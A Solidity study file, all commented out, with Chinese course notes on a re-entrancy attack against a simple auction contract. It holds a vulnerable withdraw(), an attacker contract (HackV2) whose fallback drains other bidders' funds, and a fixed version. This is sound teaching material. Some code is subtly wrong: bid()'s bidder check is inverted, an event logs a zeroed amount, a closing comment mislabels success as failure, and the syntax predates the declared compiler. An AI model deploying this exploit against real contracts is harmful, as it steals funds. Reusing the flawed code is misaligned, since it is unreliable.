// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// 肖臻老师课程中关于重入攻击的简单拍卖的例子

/*
// 对拍卖进行出价
// 随交易一起发送的ether与之前已经发送的ether的和为本次出价
function bid() public payable {
    //对于能接收以太币的函数，关键字 payable 是必须的。
    
    //拍卖尚未结束
    require(now <= auctionEnd);
    //如果出价不够高，本次出价无效，直接报错返回
    require(bids[msg.sender]+msg.value > bids[highestBidder]); 
    
    //如果此人之前未出价，则加入到竞拍者列表中
    if (!(bids[msg. sender] == uint(0))) {
        bidders.push(msg.sender);
    }

    //本次出价比当前最高价高，取代之
    highestBidder = msg.sender;
    bids[msg.sender] += msg.value;
    emit HighestBidIncreased(msg.sender, bids[msg.sender]);
}
*/

/*
// 由投标人自己取回出价
// 结束拍卖，把最高的出价发送给受益人的函数
// 这里是先清零后转账，是没有重入攻击问题的代码
event Pay2Beneficiary(address winner, uint amount);
function pay2Beneficiary() public returns (bool) {
    // 拍卖已截止
    require(now > auctionEnd);
    // 有钱可以支付
    require(bids[highestBidder] > 0);

    uint amount = bids[highestBidder];
    bids[highestBidder] = 0;
    emit Pay2Beneficiary(highestBidder, bids[highestBidder]);

    if (!beneficiary.call.value(amount)()) {
        bids[highestBidder] = amount; //这里是如果判断到转账失败，则需要把人家减少掉的余额加回来
        return false;
    }
    return true;
}
*/

/*
// 由投标人自己取回出价
// 有重入攻击问题的代码
// 使用withdraw模式
// 由投标者自己取回出价，返回是否成功
function withdraw() public returns (bool) {
    // 拍卖已经截止
    require(now > auctionEnd);
    // 拍卖成功者需要把钱给受益人，不可取回出价
    require(msg.sender!=highestBidder);
    //当前地址有钱可取
    require(bids[msg.sender] > 0);

    uint amount = bids[msg.sender];
    if (msg.sender.call.value(amount)()) { //这里就是进行转账的那一行
        bids[msg.sender] = 0; // 进行清零
        return true;
    }
    return false;
}
*/

// 重入攻击(Re-entrancy Attack):
// 1.当合约账户收到ETH但未调用函数时，会立刻调用fallback()函数
// 2.通过addr.send()、addr.transfer()、addr.call.value()()三种方式付钱都会
//   触发addr里的fallback函数
// 3.fallback()函数由用户自己编写

/*
// 重入攻击黑客攻击合约
contract HackV2 {
    uint stack = 0;
    
    function hack_bid(address addr) payable public {
        SimpleAuctionV2 sa = SimpleAuctionV2(addr);
        sa.bid.value(msg.value)();
    } // 这里就是正常的出价函数
    
    function hack_withdraw(address addr) public payable {
        SimpleAuctionV2(addr).withdraw();
    } // 这里是正常的提款函数

    function() public payable {
    // 这里就是fallback函数
        stack += 2;
        if (msg.sender.balance >= msg.value && msg.gas > 6000 && stack < 500) {
            SimpleAuctionV2(msg.sender).withdraw();
            // SimpleAuctionV2(msg.sender)里的msg.sender就是拍卖合约，因为是拍卖合约把钱转给这个黑客合约的
            // 运行到这里后会再次裕兴withdraw函数，到if (msg.sender.call.value(amount)()) {这句，再次进行给黑客合约转账
            // 而账户清零的bids[msg.sender] = 0;这句代码位于转账后面，现在已经陷入了黑客合约和withdraw函数转账给黑客合约的递归调用当中了
            // 根本执行不到下面这个清零的操作
            // 结果就是黑客在一开始出价的时候给出一个价格，拍卖结束之后就不停的从这个拍卖合约中去取钱，第二次开始取的就是别人的钱
            // 直到合约账户余额不足或者汽油费不够了或者调用栈溢出了，就停止了
        }
    }
}
*/

/*
// 由投标人自己取回出价
// 有重入攻击问题的代码，修改后的样子！！！
// 使用withdraw模式
// 由投标者自己取回出价，返回是否成功
function withdraw() public returns (bool) {
    // 拍卖已经截止
    require(now > auctionEnd);
    // 拍卖成功者需要把钱给受益人，不可取回出价
    require(msg.sender!=highestBidder);
    //当前地址有钱可取
    require(bids[msg.sender] > 0);

    uint amount = bids[msg.sender];
    bids[msg.sender] = 0; // 把清零的位置提前，先清零再转账
    if(!msg.sender.send(amount)) {
        // 而且转账时候用的是send，用transfer也可以
        // 因为transfer和send是纯转账，只发送2300矿工费，除了转账基本上干不了什么事
        // 这个就不足以让接受的合约再发起一个新的调用
        bids[msg.sender] = amount; // 如果转账失败的话，把人家减少掉的余额加回来
        return false; // 肖老师这块的代码是return true，我觉得有问题，因为执行到这表示转账失败，所以应该是return false
    }
    return true;// 肖老师这块的代码是return false，我觉得有问题，因为执行到这表示转账失败，所以应该是return true
}
*/